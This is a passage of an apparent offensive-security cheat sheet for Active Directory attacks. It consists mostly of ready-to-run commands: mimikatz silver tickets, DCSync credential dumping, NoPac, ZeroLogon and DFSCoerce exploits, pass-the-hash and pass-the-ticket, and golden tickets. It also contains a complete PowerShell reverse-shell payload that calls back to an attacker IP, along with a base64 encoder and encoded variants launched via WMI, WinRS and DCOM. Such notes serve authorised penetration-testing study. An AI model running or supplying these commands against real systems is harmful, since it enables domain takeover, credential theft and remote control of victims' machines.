</span><span id="__span-180-5"><a id="__codelineno-180-5" name="__codelineno-180-5" href="#__codelineno-180-5"></a><span class="gu">## Check Access to the SPN - e.g., HTTP</span>
</span><span id="__span-180-6"><a id="__codelineno-180-6" name="__codelineno-180-6" href="#__codelineno-180-6"></a>iwr -UseDefaultCredentials [SPN]
</span><span id="__span-180-7"><a id="__codelineno-180-7" name="__codelineno-180-7" href="#__codelineno-180-7"></a>iwr -UseDefaultCredentials http://web04.corp.com
</span><span id="__span-180-8"><a id="__codelineno-180-8" name="__codelineno-180-8" href="#__codelineno-180-8"></a>
</span><span id="__span-180-9"><a id="__codelineno-180-9" name="__codelineno-180-9" href="#__codelineno-180-9"></a><span class="gu">## Create Silver Ticket using mimikatz</span>
</span><span id="__span-180-10"><a id="__codelineno-180-10" name="__codelineno-180-10" href="#__codelineno-180-10"></a>privilege::debug
</span><span id="__span-180-11"><a id="__codelineno-180-11" name="__codelineno-180-11" href="#__codelineno-180-11"></a>kerberos::golden /sid:[DomainSID] /domain:[Domain] /target:[TargetSPN]  /service:[ServiceSPN] /rc4:[NTLM of SPN user who has access to] /user:[Any User] /ptt
</span><span id="__span-180-12"><a id="__codelineno-180-12" name="__codelineno-180-12" href="#__codelineno-180-12"></a>
</span><span id="__span-180-13"><a id="__codelineno-180-13" name="__codelineno-180-13" href="#__codelineno-180-13"></a><span class="gu">## Create Silver Ticket using mimikatz - Example</span>
</span><span id="__span-180-14"><a id="__codelineno-180-14" name="__codelineno-180-14" href="#__codelineno-180-14"></a>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com  /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeff /ptt
</span><span id="__span-180-15"><a id="__codelineno-180-15" name="__codelineno-180-15" href="#__codelineno-180-15"></a>
</span><span id="__span-180-16"><a id="__codelineno-180-16" name="__codelineno-180-16" href="#__codelineno-180-16"></a><span class="gu">## Validate Access to the SPN </span>
</span><span id="__span-180-17"><a id="__codelineno-180-17" name="__codelineno-180-17" href="#__codelineno-180-17"></a>iwr -UseDefaultCredentials [SPN]
</span><span id="__span-180-18"><a id="__codelineno-180-18" name="__codelineno-180-18" href="#__codelineno-180-18"></a>iwr -UseDefaultCredentials http://web04.corp.com
</span><span id="__span-180-19"><a id="__codelineno-180-19" name="__codelineno-180-19" href="#__codelineno-180-19"></a>iwr -UseDefaultCredentials http://web04.corp.com -o output
</span></code></pre></div>
<h4 id="domain-controller-synchronization-dcsync"><strong>Domain Controller Synchronization - DCsync</strong></h4>
<p><strong><em>DCsync using mimikatz</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-181-1"><a id="__codelineno-181-1" name="__codelineno-181-1" href="#__codelineno-181-1"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-181-2"><a id="__codelineno-181-2" name="__codelineno-181-2" href="#__codelineno-181-2"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span>
</span><span id="__span-181-3"><a id="__codelineno-181-3" name="__codelineno-181-3" href="#__codelineno-181-3"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="no">[domain]</span><span class="p">\</span><span class="no">[user]</span>
</span></code></pre></div>
<p><strong><em>DCsync using impacket</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-182-1"><a id="__codelineno-182-1" name="__codelineno-182-1" href="#__codelineno-182-1"></a>impacket-secretsdump<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-just-dc
</span><span id="__span-182-2"><a id="__codelineno-182-2" name="__codelineno-182-2" href="#__codelineno-182-2"></a>impacket-secretsdump<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>/<span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-just-dc-user<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>
</span></code></pre></div>
<h4 id="nopac-exploit">NoPac Exploit</h4>
<p><strong>Check Vulnerability</strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-183-1"><a id="__codelineno-183-1" name="__codelineno-183-1" href="#__codelineno-183-1"></a><span class="n">netexec</span> <span class="n">smb</span> <span class="no">[IP]</span> <span class="n">-u</span> <span class="no">[user]</span> <span class="n">-p</span> <span class="no">[password]</span> <span class="n">-M</span> <span class="n">nopac</span>
</span></code></pre></div>
<p><strong>Exploit</strong> </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-184-1"><a id="__codelineno-184-1" name="__codelineno-184-1" href="#__codelineno-184-1"></a><span class="c1">## https://github.com/Ridter/noPac</span>
</span><span id="__span-184-2"><a id="__codelineno-184-2" name="__codelineno-184-2" href="#__codelineno-184-2"></a>
</span><span id="__span-184-3"><a id="__codelineno-184-3" name="__codelineno-184-3" href="#__codelineno-184-3"></a>python3<span class="w"> </span>noPac.py<span class="w"> </span>domain/user:<span class="s1">&#39;password&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-use-ldap
</span><span id="__span-184-4"><a id="__codelineno-184-4" name="__codelineno-184-4" href="#__codelineno-184-4"></a>
</span><span id="__span-184-5"><a id="__codelineno-184-5" name="__codelineno-184-5" href="#__codelineno-184-5"></a>python3<span class="w"> </span>noPac.py<span class="w"> </span>domain/user:<span class="s1">&#39;password&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-use-ldap<span class="w"> </span>-shell
</span></code></pre></div>
<h4 id="zerologon-exploit-exploit">ZeroLogon Exploit Exploit</h4>
<p><strong>Check Vulnerability</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-185-1"><a id="__codelineno-185-1" name="__codelineno-185-1" href="#__codelineno-185-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-u<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>password<span class="o">]</span><span class="w"> </span>-M<span class="w"> </span>zerologon
</span></code></pre></div>
<p><strong>Exploit</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-186-1"><a id="__codelineno-186-1" name="__codelineno-186-1" href="#__codelineno-186-1"></a><span class="c1">## https://github.com/dirkjanm/CVE-2020-1472</span>
</span><span id="__span-186-2"><a id="__codelineno-186-2" name="__codelineno-186-2" href="#__codelineno-186-2"></a>
</span><span id="__span-186-3"><a id="__codelineno-186-3" name="__codelineno-186-3" href="#__codelineno-186-3"></a>python3<span class="w"> </span>zerologon_tester.py<span class="w"> </span>&lt;dc-name&gt;<span class="w"> </span>&lt;dc-ip&gt;
</span><span id="__span-186-4"><a id="__codelineno-186-4" name="__codelineno-186-4" href="#__codelineno-186-4"></a>
</span><span id="__span-186-5"><a id="__codelineno-186-5" name="__codelineno-186-5" href="#__codelineno-186-5"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;DC01$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span>
</span><span id="__span-186-6"><a id="__codelineno-186-6" name="__codelineno-186-6" href="#__codelineno-186-6"></a>impacket-secretsdump<span class="w"> </span><span class="s1">&#39;DC01$&#39;</span>@<span class="o">[</span>hostname<span class="o">]</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span>
</span></code></pre></div>
<h4 id="dfscoerce-exploit">DFSCoerce Exploit</h4>
<p><strong>Check Vulnerability</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-187-1"><a id="__codelineno-187-1" name="__codelineno-187-1" href="#__codelineno-187-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-u<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>password<span class="o">]</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus
</span></code></pre></div>
<p><strong>Exploit</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-188-1"><a id="__codelineno-188-1" name="__codelineno-188-1" href="#__codelineno-188-1"></a><span class="c1">## https://github.com/Wh04m1001/DFSCoerce</span>
</span><span id="__span-188-2"><a id="__codelineno-188-2" name="__codelineno-188-2" href="#__codelineno-188-2"></a>
</span><span id="__span-188-3"><a id="__codelineno-188-3" name="__codelineno-188-3" href="#__codelineno-188-3"></a>python3<span class="w"> </span>dfscoerce.py<span class="w"> </span>-u<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>password<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span><span class="o">[</span>domain.com<span class="o">]</span><span class="w"> </span><span class="o">[</span>Local<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span><span class="o">[</span>Target<span class="w"> </span>Ip<span class="o">]</span>
</span></code></pre></div>
<hr />
<h2 id="lateral-movement-in-active-directory"><strong>Lateral Movement in Active Directory</strong></h2>
<h3 id="active-directory-lateral-movement-techniques"><strong>Active Directory Lateral Movement Techniques</strong></h3>
<h4 id="wmi-and-winrm"><strong>WMI and WinRM</strong></h4>
<p><strong><em>Create Process on Remote Machine using WMI - e.g., calc</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-189-1"><a id="__codelineno-189-1" name="__codelineno-189-1" href="#__codelineno-189-1"></a><span class="n">wmic</span> <span class="p">/</span><span class="n">node</span><span class="p">:</span><span class="no">[IP]</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="no">[user]</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="no">[password]</span> <span class="k">process</span> <span class="n">call</span> <span class="n">create</span> <span class="s2">&quot;calc&quot;</span>
</span></code></pre></div>
<p><strong><em>Create Process on Remote Machine using PowerShell - e.g., calc</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-190-1"><a id="__codelineno-190-1" name="__codelineno-190-1" href="#__codelineno-190-1"></a><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span><span id="__span-190-2"><a id="__codelineno-190-2" name="__codelineno-190-2" href="#__codelineno-190-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;password&#39;</span><span class="p">;</span>
</span><span id="__span-190-3"><a id="__codelineno-190-3" name="__codelineno-190-3" href="#__codelineno-190-3"></a><span class="nv">$secureString</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlaintext</span> <span class="n">-Force</span><span class="p">;</span>
</span><span id="__span-190-4"><a id="__codelineno-190-4" name="__codelineno-190-4" href="#__codelineno-190-4"></a><span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">;</span>
</span><span id="__span-190-5"><a id="__codelineno-190-5" name="__codelineno-190-5" href="#__codelineno-190-5"></a>
</span><span id="__span-190-6"><a id="__codelineno-190-6" name="__codelineno-190-6" href="#__codelineno-190-6"></a><span class="nv">$options</span> <span class="p">=</span> <span class="nb">New-CimSessionOption</span> <span class="n">-Protocol</span> <span class="n">DCOM</span>
</span><span id="__span-190-7"><a id="__codelineno-190-7" name="__codelineno-190-7" href="#__codelineno-190-7"></a><span class="nv">$session</span> <span class="p">=</span> <span class="nb">New-Cimsession</span> <span class="n">-ComputerName</span> <span class="no">[IP]</span> <span class="n">-Credential</span> <span class="nv">$credential</span> <span class="n">-SessionOption</span> <span class="nv">$Options</span> 
</span><span id="__span-190-8"><a id="__codelineno-190-8" name="__codelineno-190-8" href="#__codelineno-190-8"></a><span class="nv">$command</span> <span class="p">=</span> <span class="s1">&#39;calc&#39;</span><span class="p">;</span>
</span><span id="__span-190-9"><a id="__codelineno-190-9" name="__codelineno-190-9" href="#__codelineno-190-9"></a>
</span><span id="__span-190-10"><a id="__codelineno-190-10" name="__codelineno-190-10" href="#__codelineno-190-10"></a><span class="nb">Invoke-CimMethod</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">CommandLine</span> <span class="p">=</span><span class="nv">$Command</span><span class="p">};</span>
</span></code></pre></div>
<p><strong><em>Create Reverse Shell on Remote Machine using PowerShell</em></strong></p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-191-1"><a id="__codelineno-191-1" name="__codelineno-191-1" href="#__codelineno-191-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
</span><span id="__span-191-2"><a id="__codelineno-191-2" name="__codelineno-191-2" href="#__codelineno-191-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
</span><span id="__span-191-3"><a id="__codelineno-191-3" name="__codelineno-191-3" href="#__codelineno-191-3"></a>
</span><span id="__span-191-4"><a id="__codelineno-191-4" name="__codelineno-191-4" href="#__codelineno-191-4"></a><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.10&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s1">;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</span>
</span><span id="__span-191-5"><a id="__codelineno-191-5" name="__codelineno-191-5" href="#__codelineno-191-5"></a>
</span><span id="__span-191-6"><a id="__codelineno-191-6" name="__codelineno-191-6" href="#__codelineno-191-6"></a><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;powershell -nop -w hidden -e &quot;</span> <span class="o">+</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf16&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span><span id="__span-191-7"><a id="__codelineno-191-7" name="__codelineno-191-7" href="#__codelineno-191-7"></a>
</span><span id="__span-191-8"><a id="__codelineno-191-8" name="__codelineno-191-8" href="#__codelineno-191-8"></a><span class="nb">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-192-1"><a id="__codelineno-192-1" name="__codelineno-192-1" href="#__codelineno-192-1"></a>python3<span class="w"> </span>encode.py
</span></code></pre></div>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-193-1"><a id="__codelineno-193-1" name="__codelineno-193-1" href="#__codelineno-193-1"></a><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span><span id="__span-193-2"><a id="__codelineno-193-2" name="__codelineno-193-2" href="#__codelineno-193-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;password&#39;</span><span class="p">;</span>
</span><span id="__span-193-3"><a id="__codelineno-193-3" name="__codelineno-193-3" href="#__codelineno-193-3"></a><span class="nv">$secureString</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlaintext</span> <span class="n">-Force</span><span class="p">;</span>
</span><span id="__span-193-4"><a id="__codelineno-193-4" name="__codelineno-193-4" href="#__codelineno-193-4"></a><span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">;</span>
</span><span id="__span-193-5"><a id="__codelineno-193-5" name="__codelineno-193-5" href="#__codelineno-193-5"></a><span class="nv">$Options</span> <span class="p">=</span> <span class="nb">New-CimSessionOption</span> <span class="n">-Protocol</span> <span class="n">DCOM</span>
</span><span id="__span-193-6"><a id="__codelineno-193-6" name="__codelineno-193-6" href="#__codelineno-193-6"></a><span class="nv">$Session</span> <span class="p">=</span> <span class="nb">New-Cimsession</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-Credential</span> <span class="nv">$credential</span> <span class="n">-SessionOption</span> <span class="nv">$Options</span>
</span><span id="__span-193-7"><a id="__codelineno-193-7" name="__codelineno-193-7" href="#__codelineno-193-7"></a><span class="nv">$Command</span> <span class="p">=</span> <span class="s1">&#39;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...</span>
</span><span id="__span-193-8"><a id="__codelineno-193-8" name="__codelineno-193-8" href="#__codelineno-193-8"></a><span class="s1">HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</span><span class="p">;</span>
</span><span id="__span-193-9"><a id="__codelineno-193-9" name="__codelineno-193-9" href="#__codelineno-193-9"></a><span class="nb">Invoke-CimMethod</span> <span class="n">-CimSession</span> <span class="nv">$Session</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">CommandLine</span> <span class="p">=</span><span class="nv">$Command</span><span class="p">};</span>
</span></code></pre></div>
<p><strong><em>Create Process on Remote Machine using WinRS</em></strong> </p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-194-1"><a id="__codelineno-194-1" name="__codelineno-194-1" href="#__codelineno-194-1"></a><span class="n">winrs</span> <span class="n">-r</span><span class="p">:</span><span class="no">[hostname]</span> <span class="n">-u</span><span class="p">:</span><span class="no">[user]</span> <span class="n">-p</span><span class="p">:</span><span class="no">[password]</span>  <span class="s2">&quot;cmd /c hostname &amp; whoami&quot;</span>
</span></code></pre></div>
<p><strong><em>Create Reverse Shell on Remote Machine using WinRS</em></strong> </p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-195-1"><a id="__codelineno-195-1" name="__codelineno-195-1" href="#__codelineno-195-1"></a><span class="n">winrs</span> <span class="n">-r</span><span class="p">:</span><span class="no">[hostname]</span> <span class="n">-u</span><span class="p">:</span><span class="no">[user]</span> <span class="n">-p</span><span class="p">:</span><span class="no">[password]</span>  <span class="s2">&quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...</span>
</span><span id="__span-195-2"><a id="__codelineno-195-2" name="__codelineno-195-2" href="#__codelineno-195-2"></a><span class="s2">HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;</span>
</span></code></pre></div>
<p><strong><em>Create Reverse Shell on Remote Machine using PowerShell - PSSession</em></strong></p>
<hr />
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-196-1"><a id="__codelineno-196-1" name="__codelineno-196-1" href="#__codelineno-196-1"></a><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span><span id="__span-196-2"><a id="__codelineno-196-2" name="__codelineno-196-2" href="#__codelineno-196-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;password&#39;</span><span class="p">;</span>
</span><span id="__span-196-3"><a id="__codelineno-196-3" name="__codelineno-196-3" href="#__codelineno-196-3"></a><span class="nv">$secureString</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlaintext</span> <span class="n">-Force</span><span class="p">;</span>
</span><span id="__span-196-4"><a id="__codelineno-196-4" name="__codelineno-196-4" href="#__codelineno-196-4"></a><span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$secureString</span><span class="p">;</span>
</span><span id="__span-196-5"><a id="__codelineno-196-5" name="__codelineno-196-5" href="#__codelineno-196-5"></a><span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-Credential</span> <span class="nv">$credential</span>
</span><span id="__span-196-6"><a id="__codelineno-196-6" name="__codelineno-196-6" href="#__codelineno-196-6"></a><span class="nb">Enter-PSSession</span> <span class="n">1</span>
</span></code></pre></div>
<h4 id="psexec"><strong>PsExec</strong></h4>
<p><strong><em>Requirements</em></strong> </p>
<ul>
<li>The user needs to be in Administrators local group</li>
<li>The <em>ADMIN$</em> share must be available</li>
<li>File and Printer Sharing has to be turned on</li>
</ul>
<p><strong><em>Usage</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-197-1"><a id="__codelineno-197-1" name="__codelineno-197-1" href="#__codelineno-197-1"></a><span class="p">.\</span><span class="n">PsExec64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span>  <span class="p">\\</span><span class="no">[IP]</span> <span class="n">-u</span> <span class="no">[domain]</span><span class="p">\</span><span class="no">[user]</span> <span class="n">-p</span> <span class="no">[password]</span> <span class="n">cmd</span>
</span></code></pre></div>
<h4 id="pass-the-hash"><strong>Pass the Hash</strong></h4>
<p><strong><em>Requirements</em></strong> </p>
<ul>
<li>Requires an SMB connection through the firewall (commonly port 445),</li>
<li>The Windows File and Printer Sharing feature to be enabled</li>
<li>The <em>ADMIN$</em> share must be available</li>
</ul>
<p><strong><em>Usage</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-198-1"><a id="__codelineno-198-1" name="__codelineno-198-1" href="#__codelineno-198-1"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:2892D26CDF84D7A70E2EB3B9F05C425E<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span>
</span></code></pre></div>
<h4 id="overpass-the-hash"><strong>Overpass the Hash</strong></h4>
<p><strong><em>Obtain Kerberos tickets without performing NTLM authentication over the network</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-199-1"><a id="__codelineno-199-1" name="__codelineno-199-1" href="#__codelineno-199-1"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="no">[user]</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="no">[domain]</span> <span class="p">/</span><span class="n">ntlm</span><span class="p">:</span><span class="no">[NTLM]</span> <span class="p">/</span><span class="n">run</span><span class="p">:</span><span class="n">powershell</span>
</span></code></pre></div>
<p><strong><em>Access Remote Machine Using PsExec</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-200-1"><a id="__codelineno-200-1" name="__codelineno-200-1" href="#__codelineno-200-1"></a><span class="p">.\</span><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="no">[Hostname]</span> <span class="n">cmd</span>
</span></code></pre></div>
<h4 id="pass-the-ticket"><strong>Pass the Ticket</strong></h4>
<p><strong><em>Export the TGT/TGS Tickets</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-201-1"><a id="__codelineno-201-1" name="__codelineno-201-1" href="#__codelineno-201-1"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">export</span>
</span></code></pre></div>
<p>List and Use the Exported Tickets</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-202-1"><a id="__codelineno-202-1" name="__codelineno-202-1" href="#__codelineno-202-1"></a><span class="nb">dir </span><span class="p">*.</span><span class="n">kirbi</span>
</span><span id="__span-202-2"><a id="__codelineno-202-2" name="__codelineno-202-2" href="#__codelineno-202-2"></a>
</span><span id="__span-202-3"><a id="__codelineno-202-3" name="__codelineno-202-3" href="#__codelineno-202-3"></a><span class="p">**.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-202-4"><a id="__codelineno-202-4" name="__codelineno-202-4" href="#__codelineno-202-4"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">[.</span><span class="n">kirbi</span> <span class="n">file</span><span class="p">]</span>
</span></code></pre></div>
<h4 id="dcom"><strong>DCOM</strong></h4>
<p><strong><em>Instantiate a remote MMC 2.0 application and Execute Commands</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-203-1"><a id="__codelineno-203-1" name="__codelineno-203-1" href="#__codelineno-203-1"></a><span class="nv">$dcom</span> <span class="p">=</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.Application.1&quot;</span><span class="p">,</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">))</span>
</span><span id="__span-203-2"><a id="__codelineno-203-2" name="__codelineno-203-2" href="#__codelineno-203-2"></a>
</span><span id="__span-203-3"><a id="__codelineno-203-3" name="__codelineno-203-3" href="#__codelineno-203-3"></a><span class="nv">$dcom</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="s2">&quot;/c calc&quot;</span><span class="p">,</span><span class="s2">&quot;7&quot;</span><span class="p">)</span>
</span></code></pre></div>
<p><strong><em>Instantiate a remote MMC 2.0 application and get Reverse Shell</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-204-1"><a id="__codelineno-204-1" name="__codelineno-204-1" href="#__codelineno-204-1"></a><span class="nv">$dcom</span> <span class="p">=</span> <span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.Application.1&quot;</span><span class="p">,</span><span class="s2">&quot;10.10.10.10&quot;</span><span class="p">))</span>
</span><span id="__span-204-2"><a id="__codelineno-204-2" name="__codelineno-204-2" href="#__codelineno-204-2"></a>
</span><span id="__span-204-3"><a id="__codelineno-204-3" name="__codelineno-204-3" href="#__codelineno-204-3"></a><span class="nv">$dcom</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;powershell&quot;</span><span class="p">,</span><span class="nv">$null</span><span class="p">,</span><span class="s2">&quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw...&quot;</span><span class="p">,</span><span class="s2">&quot;7&quot;</span><span class="p">)</span>
</span></code></pre></div>
<h3 id="active-directory-persistence"><strong>Active Directory Persistence</strong></h3>
<h4 id="golden-ticket"><strong>Golden Ticket</strong></h4>
<aside>


If we can get our hands on the *krbtgt* password hash, we could create our own self-made custom TGTs, also known as [*golden tickets*](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf).

</aside>

<p><strong><em>Linux - Impacket</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-205-1"><a id="__codelineno-205-1" name="__codelineno-205-1" href="#__codelineno-205-1"></a><span class="c1">## with krbtgt NThash</span>
</span><span id="__span-205-2"><a id="__codelineno-205-2" name="__codelineno-205-2" href="#__codelineno-205-2"></a>impacket-ticketer<span class="w"> </span>-nthash<span class="w"> </span><span class="o">[</span>krbtgt<span class="w"> </span>hash<span class="o">]</span><span class="w"> </span>-domain-sid<span class="w"> </span><span class="o">[</span>domainSID<span class="o">]</span><span class="w"> </span>-domain<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span><span class="w"> </span>-user-id<span class="w"> </span><span class="o">[</span>userId<span class="o">]</span><span class="w"> </span><span class="o">[</span>user<span class="o">]</span>
</span><span id="__span-205-3"><a id="__codelineno-205-3" name="__codelineno-205-3" href="#__codelineno-205-3"></a>
